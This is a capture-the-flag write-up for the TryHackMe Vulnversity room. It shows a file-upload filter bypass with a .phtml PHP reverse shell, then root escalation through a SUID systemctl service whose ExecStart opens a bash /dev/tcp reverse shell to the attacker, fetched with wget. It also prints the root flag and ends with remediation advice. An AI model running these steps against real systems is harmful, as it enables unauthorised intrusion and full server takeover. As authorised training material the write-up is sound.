# Vulnversity | TryHackMe Write-up

> **TL;DR:** Discovered a web application on a non-standard port, used Gobuster to find a hidden upload directory, bypassed its file-extension filter with a `.phtml` PHP reverse shell to land a `www-data` shell, then escalated to root by abusing a SUID `systemctl` binary to load a malicious systemd service that called back a root shell.

|  |  |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Vulnversity](https://tryhackme.com/room/vulnversity) |
| **Difficulty** | Easy |
| **Category** | Linux · web exploitation · SUID privesc |
| **Date completed** | 2026-07-10 |
| **Author** | Kevin Jose |

**Tools used:** `nmap` · `gobuster` · Burp Suite (extension fuzzing) · `nc` (netcat) · `wget` · `systemctl`
**Vulnerabilities covered:** Unrestricted file upload / filter bypass (CWE-434) · PHP code execution via `.phtml` · SUID `systemctl` privilege escalation (CWE-250)

---

## 1. Overview

Vulnversity is an Easy-rated Linux boot2root focused on web exploitation and a classic SUID abuse. The attack path has two clear stages: a PHP reverse shell uploaded through a weakly filtered upload form gives an initial `www-data` foothold, and a SUID-flagged `systemctl` binary lets that low-privilege user load a custom systemd service that fires a root reverse shell. The objective is to capture the user and root flags.

> **Note:** TryHackMe assigns a fresh IP each time the machine is deployed, so the target address differs between screenshots. Commands below use `$IP` as a placeholder - set it once per session with `export IP=<machine-ip>` and every command resolves automatically.

---

## 2. Reconnaissance

**Service scan** (results saved to `nmap.log`):

```bash
nmap -sC -sV -oN nmap.log $IP
```

Key findings - **6 open ports**:

- **21/tcp** - vsftpd 3.0.5
- **22/tcp** - OpenSSH 8.2p1 (Ubuntu)
- **139/tcp & 445/tcp** - Samba smbd 4.6.2
- **3128/tcp** - Squid HTTP proxy 4.10
- **3333/tcp** - Web application (Apache 2.4.41)

The web application on port 3333 is the point of entry; everything else is a dead end for this box. The Squid proxy on 3128 was confirmed by grepping the nmap log:

```bash
grep "squid" nmap.log
# | http-server-header: squid/4.10
```

---

## 3. Enumeration

### Web content discovery - port 3333

```bash
gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Gobuster found five directories, with `/internal` standing out as non-standard:

```
/images    (Status: 301)
/css       (Status: 301)
/js        (Status: 301)
/fonts     (Status: 301)
/internal  (Status: 301)   ← upload form
```

Browsing to `http://$IP:3333/internal/` reveals a file upload form. Attempting to upload a `.php` reverse shell returns an error - the form filters by file extension.

### File extension fuzzing - Burp Suite Intruder

The upload request was intercepted in Burp and the extension fuzzed with a list of PHP-adjacent values (`.php`, `.php3`, `.php4`, `.php5`, `.phtml`). The `.phtml` extension was accepted; all others returned an error. This is the bypass.

---

## 4. Exploitation - Initial Foothold

**Vulnerability:** Unrestricted file upload with a blocklist-only extension filter **(CWE-434)**

**Why it works:** The upload form blocks `.php` by name but does not validate against a strict allowlist of safe types. The `.phtml` extension is parsed and executed by Apache as PHP - uploading a `.phtml` reverse shell results in remote code execution when the file is requested.

**Steps**

1. Prepare a PHP reverse shell (e.g. PentestMonkey's `php-reverse-shell.php`), set its callback IP and port to the attacker machine, and rename it with a `.phtml` extension.

2. Start a Netcat listener on the attacker machine:

   ```bash
   nc -lvnp 1234
   ```

3. Upload the `.phtml` shell through the `/internal/` form, then browse to it at:

   ```
   http://$IP:3333/internal/uploads/<shell-name>.phtml
   ```

4. Netcat catches the callback:

   ```
   connect to [attacker] from (UNKNOWN) [$IP]
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

**Result:** Reverse shell as `www-data`.

---

## 5. Privilege Escalation

### Enumeration

From the `www-data` shell, enumerate all SUID-flagged executables:

```bash
find / -perm -u=s -type f 2>/dev/null
```

The non-standard result is `/bin/systemctl`:

```bash
ls -la /bin/systemctl
# -rwsr-xr-x 1 root root 996584 Jun 17 2024 /bin/systemctl
```

**Vector:** SUID `systemctl` - malicious service file registered and started via `systemctl link/enable/start`

**Why it works:** `systemctl` runs with effective UID 0 due to the SUID bit, regardless of who invokes it. By crafting a service file with `User=root` and an `ExecStart` that fires a reverse shell, then using `systemctl` to register and start it, the spawned process inherits root privileges.

**Steps**

1. On the attacker machine, create the malicious service file `root.service`:

   ```ini
   [Unit]
   Description=root

   [Service]
   Type=Simple
   User=root
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'

   [Install]
   WantedBy=multi-user.target
   ```

2. Serve it via a Python HTTP server on the attacker machine:

   ```bash
   sudo python -m SimpleHTTPServer 80
   ```

3. On the target (`www-data` shell), download the service file into `/tmp`:

   ```bash
   cd /tmp
   wget http://<attacker-ip>/root.service
   ```

4. Open a second Netcat listener on the attacker machine:

   ```bash
   nc -lvnp 4444
   ```

5. On the target, use the SUID `systemctl` to load and start the service:

   ```bash
   /bin/systemctl link /tmp/root.service
   /bin/systemctl enable root.service
   /bin/systemctl start root.service
   ```

6. The second listener receives the root callback:

   ```
   connect to [attacker] from (UNKNOWN) [$IP]
   bash: no job control in this shell
   ```

**Result:** Root shell.

```bash
cd /root
cat root.txt
# a58ff8579f0a9270368d33a9966c7fd5
```

**Root flag:** `a58ff8579f0a9270368d33a9966c7fd5`

---

## 6. Remediation

| Finding | Risk | Remediation |
|---|---|---|
| File upload extension filter bypass (`.phtml`) | Remote code execution via uploaded PHP shell | Validate uploads against a strict allowlist of safe MIME types and extensions; store uploads outside the web root. |
| PHP execution in the uploads directory | Uploaded shell runs server-side code | Disable PHP execution in upload directories (Apache `php_flag engine off`); never serve uploaded files with execute permissions. |
| SUID bit on `/bin/systemctl` | Low-privilege user can start root-level services | Remove the SUID bit (`chmod u-s /bin/systemctl`); manage service permissions via `sudo` with explicit rules rather than SUID. |
| Defence-in-depth failure | Single exploit chain from web shell to root | Audit SUID binaries regularly; apply least-privilege to the web process; treat upload validation and SUID controls as independent layers. |

---

## 7. Lessons Learned

- A blocklist-based extension filter is not sufficient - `.php` blocked but `.phtml` accepted is the textbook reason why allowlists are the correct control for file uploads.
- SUID on system utilities like `systemctl` is a reliable local escalation path; `find / -perm -u=s` after getting a shell should be standard practice.
- The two-stage payload delivery (Python HTTP server on attacker → `wget` on target) is a clean technique for moving files onto a box where only a limited web shell is available.

---

## 8. References

- Room: https://tryhackme.com/room/vulnversity
- CWE-434: Unrestricted Upload of File with Dangerous Type - https://cwe.mitre.org/data/definitions/434.html
- CWE-250: Execution with Unnecessary Privileges - https://cwe.mitre.org/data/definitions/250.html
- GTFOBins - systemctl: https://gtfobins.github.io/gtfobins/systemctl/

---

*Lab conducted in an authorised, isolated training environment (TryHackMe). All activity was performed against systems I am explicitly permitted to test.*